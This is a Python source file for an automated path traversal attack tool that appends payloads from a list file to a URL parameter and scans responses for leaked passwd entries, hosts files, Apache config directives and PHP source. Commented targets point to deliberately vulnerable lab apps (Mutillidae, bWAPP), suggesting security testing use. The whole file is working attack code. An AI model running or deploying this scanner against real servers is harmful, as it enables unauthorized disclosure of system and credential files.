from general import *
import re
import requests
from http.cookies import SimpleCookie


class TravAttack:

    def __init__(self, url):
        self.url = url
        self.log = list()
        self.log_csv = list()
        self.match = ("boot\W*loader",
                      "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t]+[a-zA-Z0-9-_.]*",
                      "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t][a-zA-Z0-9-_.]*",
                      "\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]+:[\/a-zA-Z0-9]*",
                      "AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile",
                      "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
                      "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV")

        self.boot(self.url)

    def boot(self, url):
        found = 0
        catchdata = ""
        part = re.split("([^\?]+)(\?.*=)", url)
        list_attack = file_to_set("db/db_travelsal.txt")
        list_vuln = file_to_set("db/db_trav_vuln.txt")
        berhasil = False
        for list in list_attack:
            #print(part[1] + part[2] + list)
            fullLink = part[1] + part[2] + list
            req = request()
            #print(req.)
            req.query(fullLink)
            for find in self.match:
                catchdata = re.findall(str(find), req.raw)
                if req.raw.__contains__("Index of"):
                    self.log.append("traversal Attack success")
                    berhasil = True
                    break
                if len(catchdata) != 0:
                    found += len(catchdata)
                    berhasil = True
                    # print(" Contents Found: " + str(len(catchdata)))
                    break
            if berhasil:
                break

        if berhasil:
            self.log.append(url)
            self.log.append("~Contents Found: " + str(found))
            for i in catchdata:
                self.log.append("~" + str(i))
            data = ["Traversal Path Attack", self.url]
            self.log_csv.append(data)
        else:
            print("fail traversal attack")

    def return_output(self):
        output = self.log
        return output

    def return_output_csv(self):
        output = self.log_csv
        return output


class request(object):
    def query(self, link, cookie=None):
        if cookie:
            rawdata = "Cookie: " + cookie
            cookie = SimpleCookie()
            cookie.load(rawdata)

        try:
            req = requests.get(link, cookies=cookie, allow_redirects=True, timeout=2)
            self.raw = req.text
            self.code = req.status_code
        except:
            return False

#TravAttack("http://192.168.10.8/mutillidae?page=text-file-viewer.php")
#trav_attack("http://192.168.58.101/bWAPP/directory_traversal_1.php?page=a.txt")
